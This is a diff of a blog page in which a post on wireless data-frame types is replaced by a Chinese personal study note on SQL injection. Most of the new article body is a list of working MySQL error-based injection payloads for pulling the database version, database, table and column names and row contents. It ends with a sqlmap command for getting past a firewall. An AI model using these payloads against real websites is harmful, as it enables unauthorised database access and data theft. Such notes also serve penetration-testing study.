@@ -6,20 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>无线渗透复学（五） | Numbird的个人博客</title>
+  <title>38.重学sql注入笔记 | Numbird的个人博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="总记书接上回。">
+  <meta name="description" content="总记暑假来临了，重拾渗透，又是从头开始的一次，哎，记录一下平时的笔记吧">
 <meta property="og:type" content="article">
-<meta property="og:title" content="无线渗透复学（五）">
-<meta property="og:url" content="http://yoursite.com/2020/04/29/8/index.html">
+<meta property="og:title" content="38.重学sql注入笔记">
+<meta property="og:url" content="http://yoursite.com/2021/07/14/38-%E9%87%8D%E5%AD%A6sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="Numbird的个人博客">
-<meta property="og:description" content="总记书接上回。">
+<meta property="og:description" content="总记暑假来临了，重拾渗透，又是从头开始的一次，哎，记录一下平时的笔记吧">
 <meta property="og:locale" content="ch">
-<meta property="article:published_time" content="2020-04-29T01:34:17.000Z">
-<meta property="article:modified_time" content="2020-04-29T02:40:52.443Z">
+<meta property="article:published_time" content="2021-07-14T02:56:15.000Z">
+<meta property="article:modified_time" content="2021-07-16T01:58:14.098Z">
 <meta property="article:author" content="Numbird">
-<meta property="article:tag" content="无线渗透">
-<meta property="article:tag" content="数据帧">
+<meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Numbird的个人博客" type="application/atom+xml">
@@ -152,14 +151,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-8" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-38-重学sql注入笔记" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      无线渗透复学（五）
+      38.重学sql注入笔记
     </h1>
   
 
@@ -176,21 +175,43 @@
 <!--显示阅读次数完毕-->
         
         
-<a href="/2020/04/29/8/" class="archive-article-date">
-  	<time datetime="2020-04-29T01:34:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-29</time>
+<a href="/2021/07/14/38-%E9%87%8D%E5%AD%A6sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2021-07-14T02:56:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-14</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="总记"><a href="#总记" class="headerlink" title="总记"></a>总记</h1><p>书接上回。</p>
+        <h1 id="总记"><a href="#总记" class="headerlink" title="总记"></a>总记</h1><p>暑假来临了，重拾渗透，又是从头开始的一次，哎，记录一下平时的笔记吧</p>
 <a id="more"></a>
 
-<h2 id="DATA-FRAMES"><a href="#DATA-FRAMES" class="headerlink" title="DATA FRAMES"></a>DATA FRAMES</h2><p> 传数据用，共16种子类型，但是大部分用于控制通信质量的</p>
-<h3 id="空数据帧（NULL-）"><a href="#空数据帧（NULL-）" class="headerlink" title="空数据帧（NULL ）"></a>空数据帧（NULL ）</h3><p>STA用于声明自己将要进入省电模式</p>
+<h2 id="Sql注入简记"><a href="#Sql注入简记" class="headerlink" title="Sql注入简记"></a>Sql注入简记</h2><h3 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h3><ul>
+<li><p>查看mysql版本</p>
+<p>and exists(select  * from (select * from (select name_const(@@version,0))a join (select name_const(@@version,0))b)c)</p>
+</li>
+<li><p>爆所有库  可以跨库，FROM infromation_schema.schemata LIMIT 0,1) 位置</p>
+<p>and (select 1 from (select count(<em>),concat((select (select (SELECT distinct concat(0x7e,0x27,schema_name,0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)\</em>2))x from information_schema.tables group by x)a) and 1=1</p>
+</li>
+<li><p>爆当前数据库</p>
+<p>and (select 1 from (select count(<em>),concat((select concat(0x7e,0x27,hex(cast(database() as char),0x27,0x7e) from information_schema.tables limit 0,1),floor(rand(0)\</em>2))x from information_schema.tables group by x)a) and 1=1</p>
+</li>
+<li><p>爆表，表名</p>
+<p>and (select 1 from (select count(<em>),concat((select (select (SELECT distinct concat(0x7e,0x27,hex(cast(table_name as char),0x27,0x7e) from information_schema.tables where table_schema=0x库名 limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)\</em>2))x from information_schema.tables group by x)a) and 1=1</p>
+</li>
+<li><p>爆字段  16进制</p>
+<p>and (select 1 from (select count(<em>),concat((select (select (SELECT distinct concat(0x7e,0x27,column_name,0x27,0x7e) from information_schema.columns where table_schema=0x库名 and table_name=0x表名 limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)\</em>2))x from information_schema.tables group by x)a) and 1=1</p>
+</li>
+<li><p>爆内容  表明字段不用转换</p>
+<p>and (select 1 from (select count(<em>),concat((select (select (select concat(0x7e,0x27,表名.字段,0x27,0x7e) from 表名 limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)\</em>2))x from information_schema.tables group by x)a) and 1=1</p>
+</li>
+</ul>
 <hr>
-<p><strong>到此，帧类型大概学习完毕。</strong></p>
+<ul>
+<li><p>利用sqlmap绕过防火墙</p>
+<p>-v 3 –tamper=sapce2comment -safe-freq=3 –dbs –timout=10 dbms=Microsoft SQL Server –threads 3 –no-cast</p>
+</li>
+</ul>
 
       
 
@@ -225,11 +246,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">无线渗透</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">数据帧</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
         		</li>
       		
 		</ul>
@@ -285,7 +302,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/29/8/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2021/07/14/38-%E9%87%8D%E5%AD%A6sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -299,18 +316,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/04/29/9/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          无线渗透复学（六）
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/04/27/7/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">无线渗透复学（四）</div>
+    <a href="/2021/03/04/37-%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84PHP%E5%AD%A6%E4%B9%A0%E7%94%9F%E6%B4%BB/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">37.从零开始的PHP学习生活</div>
       <i class="icon-circle-right"></i>
     </a>
   
